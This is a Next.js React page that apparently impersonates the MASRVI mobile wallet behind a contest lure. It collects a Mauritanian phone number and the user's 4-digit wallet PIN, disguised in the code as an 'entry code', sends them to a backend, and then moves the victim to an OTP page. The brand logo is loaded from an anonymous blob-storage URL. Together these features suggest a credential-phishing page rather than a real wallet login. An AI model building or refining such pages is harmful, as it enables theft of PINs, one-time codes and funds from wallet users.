import { useState } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import PinKeypad from '@/components/PinKeypad';
import { useContest } from '@/context/ContestContext';

export default function RegisterPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { updateRegistration } = useContest();
  const [phone, setPhone] = useState('');
  const [entryCode, setEntryCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showPinPad, setShowPinPad] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setPhone(value);
  };

  const handlePinChange = (newValue) => {
    setEntryCode(newValue);
  };

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();
    if (phone.length < 8 || entryCode.length < 4) return;
    
    setLoading(true);

    try {
      const { data } = await axios.post('/api/register', { phone, entryCode });

      if (data.success) {
        updateRegistration(phone, entryCode);
        // Show success animation
        setShowSuccess(true);
        setTimeout(() => {
          router.push('/otp');
        }, 1500);
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  // Success Animation Screen
  if (showSuccess) {
    return (
      <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-primary-500 via-primary-600 to-primary-700 dark:from-primary-700 dark:via-primary-800 dark:to-primary-900">
        <div className="text-center animate-bounce-in">
          {/* Success Checkmark */}
          <div className="w-24 h-24 md:w-32 md:h-32 mx-auto mb-6 bg-white rounded-full flex items-center justify-center shadow-2xl">
            <svg className="w-12 h-12 md:w-16 md:h-16 text-primary-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          
          <h2 className="text-2xl md:text-3xl font-bold text-white mb-2">
            {t('share.success')}
          </h2>
          
          <div className="flex items-center justify-center gap-2 mt-4">
            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
            <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
          </div>
        </div>
      </main>
    );
  }

  // Show PIN keypad screen
  if (showPinPad) {
    return (
      <>
        <Head>
          <title>MASRVI - {t('registration.password_label')}</title>
        </Head>

        <main className="min-h-screen flex flex-col bg-gray-50 dark:bg-gray-900 transition-colors">
          {/* Back Button */}
          <div className="px-4 py-4">
            <button
              onClick={() => setShowPinPad(false)}
              className="inline-flex items-center gap-2 text-gray-700 dark:text-gray-300 hover:text-primary-700 dark:hover:text-primary-400 transition-colors text-base"
            >
              <span className="rtl:rotate-180">&#10094;</span>
              <span>{t('registration.back')}</span>
            </button>
          </div>

          <div className="flex-1 flex flex-col items-center justify-center px-4">
            {/* PIN Keypad */}
            <div className="w-full max-w-sm animate-fade-in-up">
              <PinKeypad
                value={entryCode}
                onChange={handlePinChange}
                maxLength={4}
                instruction={t('registration.enter_pin_instruction')}
              />
            </div>

            {/* Submit button when PIN is complete */}
            {entryCode.length === 4 && (
              <button
                onClick={handleSubmit}
                disabled={loading}
                className="mt-8 w-full max-w-xs py-4 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 text-white font-bold rounded-2xl transition-all shadow-lg text-base animate-fade-in-up btn-primary"
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  </span>
                ) : t('registration.submit')}
              </button>
            )}
          </div>
        </main>

        <ErrorModal
          isOpen={showError}
          title={t('errors.title')}
          message={t('errors.invalid_registration')}
          buttonText={t('errors.retry')}
          onClose={() => setShowError(false)}
        />
      </>
    );
  }

  // Main registration form
  return (
    <>
      <Head>
        <title>MASRVI - {t('registration.submit')}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100 dark:from-gray-900 dark:via-gray-800 dark:to-gray-900 transition-colors">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-gray-600 dark:text-gray-400 hover:text-primary-700 dark:hover:text-primary-400 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md animate-fade-in-up">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo - Bigger */}
              <div className="text-center mb-6 md:mb-8">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/7923244c-5be4-4f29-bbe9-96c23ebaebc9.jpeg"
                  alt="Masrvi Logo"
                  width={180}
                  height={72}
                  className="h-16 md:h-20 w-auto mx-auto mb-4 object-contain"
                />
                <h1 className="text-xl md:text-2xl font-bold text-gray-800 dark:text-white">{t('registration.submit')}</h1>
              </div>

              <div className="space-y-5 md:space-y-6">
                {/* Phone Input */}
                <div className="animate-fade-in-up stagger-1">
                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 dark:text-gray-200 mb-2 text-right">
                    {t('registration.phone_label')}
                  </label>
                  <div className="flex gap-2">
                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 dark:text-primary-400 font-bold text-base md:text-lg">
                      222
                    </div>
                    <input
                      id="phone"
                      type="tel"
                      inputMode="numeric"
                      maxLength={8}
                      value={phone}
                      onChange={handlePhoneChange}
                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium dark:text-white"
                      required
                    />
                  </div>
                </div>

                {/* Password - Click to show PIN pad */}
                <div className="animate-fade-in-up stagger-2">
                  <label className="block text-sm font-semibold text-gray-800 dark:text-gray-200 mb-2 text-right">
                    {t('registration.password_label')}
                  </label>
                  <button
                    type="button"
                    onClick={() => phone.length >= 8 && setShowPinPad(true)}
                    disabled={phone.length < 8}
                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl text-right flex items-center justify-between disabled:opacity-50 disabled:cursor-not-allowed transition-all hover:border-primary-400"
                  >
                    <span className="flex gap-2">
                      {entryCode ? (
                        [...Array(4)].map((_, i) => (
                          <span
                            key={i}
                            className={`w-3 h-3 rounded-full transition-colors ${
                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300 dark:bg-gray-600'
                            }`}
                          />
                        ))
                      ) : (
                        <span className="text-gray-400 dark:text-gray-500 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
                      )}
                    </span>
                    <svg className="w-5 h-5 text-gray-400 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </button>
                </div>

                {/* Submit Button */}
                <div className="pt-2 md:pt-4 animate-fade-in-up stagger-3">
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={loading || phone.length < 8 || entryCode.length < 4}
                    className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg btn-primary"
                  >
                    {loading ? (
                      <span className="flex items-center justify-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      </span>
                    ) : t('registration.submit')}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Green Bottom Section */}
        <div className="bg-primary-500 dark:bg-primary-700 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
          <p className="text-white text-center text-base md:text-lg font-medium">
            Mon wallet 100% simple et securise
          </p>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_registration')}
        buttonText={t('errors.retry')}
        onClose={() => setShowError(false)}
      />
    </>
  );
}
